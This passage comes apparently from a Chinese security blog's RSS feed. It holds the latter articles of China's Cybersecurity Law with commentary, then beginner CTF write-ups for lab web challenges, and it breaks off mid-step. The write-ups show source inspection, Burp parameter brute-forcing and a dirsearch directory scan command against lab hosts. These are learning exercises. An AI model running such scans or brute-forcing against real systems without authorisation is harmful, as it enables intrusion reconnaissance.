任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。<br>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p></li><li><p>第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。<br>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p></li><li><p>第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p></li></ul><h2 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h2><ul><li><p>第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p></li><li><p>第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p></li><li><p>第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。<br>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。<br>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p></li><li><p>第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p></li><li><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p></li><li><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p></li><li><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p></li><li><p>第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p></li><li><p>第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p></li><li><p>第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p></li><li><p>第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p></li></ul><h2 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h2><ul><li><p>第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；<br>拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。<br>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；<br>拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p></li><li><p>第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p></li><li><p>（一）设置恶意程序的；</p></li><li><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；<br>（- 三）擅自终止为其产品、服务提供安全维护的。</p></li><li><p>第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p></li><li><p>第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p></li><li><p>第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。<br>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。<br>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p></li><li><p>第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。<br>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p></li><li><p>第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p></li></ul><p>第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><ul><li><p>第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。<br>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p></li><li><p>第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。<br>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p></li><li><p>第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p></li><li><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p></li><li><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p></li><li><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p></li><li><p>第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p></li><li><p>第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p></li><li><p>第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p></li><li><p>第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。<br>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p></li><li><p>第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。<br>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p></li><li><p>第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p></li></ul><h2 id="第七章附-则"><a href="#第七章附-则" class="headerlink" title="第七章附 则"></a>第七章附 则</h2><ul><li><p>第七十六条 本法下列用语的含义：</p></li><li><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p></li><li><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p></li><li><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p></li><li><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p></li><li><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p></li><li><p>第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p></li><li><p>第七十八条 军事网络的安全保护，由中央军事委员会另行规定。</p></li><li><p>第七十九条 本法自 2017 年 6 月 1 日起施行。</p></li></ul><h2 id="内容解读"><a href="#内容解读" class="headerlink" title="内容解读"></a>内容解读</h2><p>《网络安全法》是我国第一部全面规范网络空间安全管理方面问题的基础性法律，是我国网络空间法治建设的重要里程碑，是依法治网、化解网络风险的法律重器，是让互联网在法治轨道上健康运行的重要保障。 [3] 《网络安全法》将近年来一些成熟的好做法制度化，并为将来可能的制度创新做了原则性规定，为网络安全工作提供切实法律保障。本法在以下几个方面值得特别关注：</p><h2 id="一、《网络安全法》的基本原则"><a href="#一、《网络安全法》的基本原则" class="headerlink" title="一、《网络安全法》的基本原则"></a>一、《网络安全法》的基本原则</h2><ul><li><p>第一，网络空间主权原则。《网络安全法》第 1 条 “立法目的” 开宗明义，明确规定要维护我国网络空间主权。网络空间主权是一国国家主权在网络空间中的自然延伸和表现。习近平总书记指出，《联合国宪章》确立的主权平等原则是当代国际关系的基本准则，覆盖国与国交往各个领域，其原则和精神也应该适用于网络空间。各国自主选择网络发展道路、网络管理模式、互联网公共政策和平等参与国际网络空间治理的权利应当得到尊重。第 2 条明确规定《网络安全法》适用于我国境内网络以及网络安全的监督管理。这是我国网络空间主权对内最高管辖权的具体体现。</p></li><li><p>/第二，网络安全与信息化发展并重原则。习近平总书记指出，安全是发展的前提，发展是安全的保障，安全和发展要同步推进。网络安全和信息化是一体之两翼、驱动之双轮，必须统一谋划、统一部署、统一推进、统一实施。《网络安全法》第 3 条明确规定，国家坚持网络安全与信息化并重，遵循积极利用、科学发展、依法管理、确保安全的方针；既要推进网络基础设施建设，鼓励网络技术创新和应用，又要建立健全网络安全保障体系，提高网络安全保护能力，做到 “双轮驱动、两翼齐飞”。</p></li><li><p>第三，共同治理原则。网络空间安全仅仅依靠政府是无法实现的，需要政府、企业、社会组织、技术社群和公民等网络利益相关者的共同参与。《网络安全法》坚持共同治理原则，要求采取措施鼓励全社会共同参与，政府部门、网络建设者、网络运营者、网络服务提供者、网络行业相关组织、高等院校、职业学校、社会公众等都应根据各自的角色参与网络安全治理工作。</p></li></ul><h2 id="二、《网络安全法》提出制定网络安全战略，明确网络空间治理目标，提高了我国网络安全政策的透明度"><a href="#二、《网络安全法》提出制定网络安全战略，明确网络空间治理目标，提高了我国网络安全政策的透明度" class="headerlink" title="二、《网络安全法》提出制定网络安全战略，明确网络空间治理目标，提高了我国网络安全政策的透明度"></a>二、《网络安全法》提出制定网络安全战略，明确网络空间治理目标，提高了我国网络安全政策的透明度</h2><ul><li>《网络安全法》第 4 条明确提出了我国网络安全战略的主要内容，即：明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。第 7 条明确规定，我国致力于 “推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。” 这是我国第一次通过国家法律的形式向世界宣示网络空间治理目标，明确表达了我国的网络空间治理诉求。上述规定提高了我国网络治理公共政策的透明度，与我国的网络大国地位相称，有利于提升我国对网络空间的国际话语权和规则制定权，促成网络空间国际规则的出台。</li></ul><h2 id="三、《网络安全法》进一步明确了政府各部门的职责权限，完善了网络安全监管体制"><a href="#三、《网络安全法》进一步明确了政府各部门的职责权限，完善了网络安全监管体制" class="headerlink" title="三、《网络安全法》进一步明确了政府各部门的职责权限，完善了网络安全监管体制"></a>三、《网络安全法》进一步明确了政府各部门的职责权限，完善了网络安全监管体制</h2><ul><li>《网络安全法》将现行有效的网络安全监管体制法制化，明确了网信部门与其他相关网络监管部门的职责分工。第 8 条规定，国家网信部门负责统筹协调网络安全工作和相关监督管理工作，国务院电信主管部门、公安部门和其他有关机关依法在各自职责范围内负责网络安全保护和监督管理工作。这种 “1+X” 的监管体制，符合当前互联网与现实社会全面融合的特点和我国监管需要。</li></ul><h2 id="四、《网络安全法》强化了网络运行安全，重点保护关键信息基础设施"><a href="#四、《网络安全法》强化了网络运行安全，重点保护关键信息基础设施" class="headerlink" title="四、《网络安全法》强化了网络运行安全，重点保护关键信息基础设施"></a>四、《网络安全法》强化了网络运行安全，重点保护关键信息基础设施</h2><ul><li>《网络安全法》第三章用了近三分之一的篇幅规范网络运行安全，特别强调要保障关键信息基础设施的运行安全。关键信息基础设施是指那些一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的系统和设施。网络运行安全是网络安全的重心，关键信息基础设施安全则是重中之重，与国家安全和社会公共利益息息相关。为此，《网络安全法》强调在网络安全等级保护制度的基础上，对关键信息基础设施实行重点保护，明确关键信息基础设施的运营者负有更多的安全保护义务，并配以国家安全审查、重要数据强制本地存储等法律措施，确保关键信息基础设施的运行安全。</li></ul><h2 id="五、《网络安全法》完善了网络安全义务和责任，加大了违法惩处力度"><a href="#五、《网络安全法》完善了网络安全义务和责任，加大了违法惩处力度" class="headerlink" title="五、《网络安全法》完善了网络安全义务和责任，加大了违法惩处力度"></a>五、《网络安全法》完善了网络安全义务和责任，加大了违法惩处力度</h2><ul><li>《网络安全法》将原来散见于各种法规、规章中的规定上升到人大法律层面，对网络运营者等主体的法律义务和责任做了全面规定，包括守法义务，遵守社会公德、商业道德义务，诚实信用义务，网络安全保护义务，接受监督义务，承担社会责任等，并在 “网络运行安全”、“网络信息安全”、“监测预警与应急处置” 等章节中进一步明确、细化。在 “法律责任” 中则提高了违法行为的处罚标准，加大了处罚力度，有利于保障《网络安全法》的实施。</li></ul><h2 id="六、《网络安全法》将监测预警与应急处置措施制度化、法制化"><a href="#六、《网络安全法》将监测预警与应急处置措施制度化、法制化" class="headerlink" title="六、《网络安全法》将监测预警与应急处置措施制度化、法制化"></a>六、《网络安全法》将监测预警与应急处置措施制度化、法制化</h2><ul><li>《网络安全法》第五章将监测预警与应急处置工作制度化、法制化，明确国家建立网络安全监测预警和信息通报制度，建立网络安全风险评估和应急工作机制，制定网络安全事件应急预案并定期演练。这为建立统一高效的网络安全风险报告机制、情报共享机制、研判处置机制提供了法律依据，为深化网络安全防护体系，实现全天候全方位感知网络安全态势提供了法律保障。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="中国网络安全法" scheme="http://www.xiaocaibi.top/tags/%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    
    <category term="web安全小菜逼" scheme="http://www.xiaocaibi.top/tags/web%E5%AE%89%E5%85%A8%E5%B0%8F%E8%8F%9C%E9%80%BC/"/>
    
    <category term="法律" scheme="http://www.xiaocaibi.top/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>掌控安全CTF解题</title>
    <link href="http://www.xiaocaibi.top/posts/a7cfb8f6.html"/>
    <id>http://www.xiaocaibi.top/posts/a7cfb8f6.html</id>
    <published>2021-09-16T07:39:08.000Z</published>
    <updated>2021-09-20T08:47:43.807Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="掌控安全CTF解题"><a href="#掌控安全CTF解题" class="headerlink" title="掌控安全CTF解题"></a>掌控安全CTF解题</h2><h4 id="第一题-web1"><a href="#第一题-web1" class="headerlink" title="第一题 web1"></a>第一题 web1</h4><pre class="line-numbers language-none"><code class="language-none">靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web1/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>进入靶场<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916141500.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916141404.png"></li><li>根据题目提示,按f12打开开发者工具查看源代码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916141939.png"></li><li>进来之后,我们发现里面什么都没有,只有一个js的文件路径,我猜应该放在js里面面,./3719372767312836781.js<pre class="line-numbers language-none"><code class="language-none">sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web1/3719372767312836781.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916142159.png"></li><li>进来之后发现了有一串Unicode值,于是游览器搜索String.fromCharCode,原来这里调用了JavaScript的函数<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916142437.png"></li><li>我们使用在线工具进行转换,就可以得到flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916143220.png"></li></ul><h4 id="第二题web2"><a href="#第二题web2" class="headerlink" title="第二题web2"></a>第二题web2</h4><pre class="line-numbers language-none"><code class="language-none">靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web2/2.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>进入靶场<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916143500.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916143840.png"></p></li><li><p>然后按f12查看源码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916144839.png"></p></li><li><p>查看了源码什么都没有发现,这是我们可以按ctrl+u<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916145111.png"></p></li><li><p>就可以获得flag</p><h4 id="第三题web3"><a href="#第三题web3" class="headerlink" title="第三题web3"></a>第三题web3</h4><pre class="line-numbers language-none"><code class="language-none">靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web3/webl.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进入靶场<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916171553.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916171654.png"></p></li><li><p>使用burp工具进行爆破,将webl.php,l作为参数,使用26个大小写字母和0-10作为字典进行爆破<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916172251.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916172415.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916172842.png"></p><h4 id="第四题web4"><a href="#第四题web4" class="headerlink" title="第四题web4"></a>第四题web4</h4><pre class="line-numbers language-none"><code class="language-none">靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web4/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916153307.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916153417.png"></p></li><li><p>按f12查看源代码就直接可以获得falg<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916153545.png"></p></li></ul><h4 id="第五题web5"><a href="#第五题web5" class="headerlink" title="第五题web5"></a>第五题web5</h4><pre class="line-numbers language-none"><code class="language-none">靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web5/index.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>进入靶场<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916155852.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916155926.png"></li><li>根据提示,我们打开burp开启抓包<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916161543.png"></li><li>由于该网站是静态网页,burp抓包不到包,我们需要在游览器将index.html,改成index.php<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916162056.png"></li><li>这时候抓包了两个包,点击查看源代码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916162209.png"></li><li>就可以获得falg</li></ul><h4 id="第六题web6"><a href="#第六题web6" class="headerlink" title="第六题web6"></a>第六题web6</h4><pre class="line-numbers language-none"><code class="language-none">靶场环境:http://sz6m1880.ia.aqlab.cn/Web-Security/CTF/1/web6/8.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>进入靶场<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916162808.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916162911.png"></li><li>按f12查看源代码直获得flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210916163113.png"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://www.xiaocaibi.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>从0到1CTF成长之路题目解题</title>
    <link href="http://www.xiaocaibi.top/posts/1cd2f2cf.html"/>
    <id>http://www.xiaocaibi.top/posts/1cd2f2cf.html</id>
    <published>2021-09-14T02:49:26.000Z</published>
    <updated>2021-09-20T08:47:43.791Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="成长之路集合"><a href="#成长之路集合" class="headerlink" title="成长之路集合"></a>成长之路集合</h2><h6 id="1题常见的搜集"><a href="#1题常见的搜集" class="headerlink" title="1题常见的搜集"></a>1题常见的搜集</h6><pre class="line-numbers language-none"><code class="language-none">靶场链接:http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>知识:</p><pre class="line-numbers language-none"><code class="language-none">掌握使用dirsearch工具链接:https://github.com/maurosoria/dirsearch/dirsearch的用法dirsearch.py -u 网址 -e 语言(一般用*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>步骤</p></li><li><p>(1)进入靶场,是这样子的<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210913175204.png"></p></li><li><p>(2)首先我们使用dirsearch对网站的目录进行扫描</p><pre class="line-numbers language-none"><code class="language-none">python3 dirsearch.py -u http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com/ -e php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210913175558.png"></p><pre class="line-numbers language-none"><code class="language-none">发现index.php~robost.txt                                                                                                     index.php.swpindex.php/loginindex.php                                                                                                              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>绿色的200表示请求成功</p></li><li><p>(3)我们直接访问</p><pre class="line-numbers language-none"><code class="language-none">http://eci-2ze5s8j33kfzmce3ljvb.cloudeci1.ichunqiu.com/index.php~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>(4)在这里可以看到有fang2一串字符,我们先创建个文本将这段先保存下来<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210913180715.png"></p></li><li><p>(5)在进入robots.txt<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 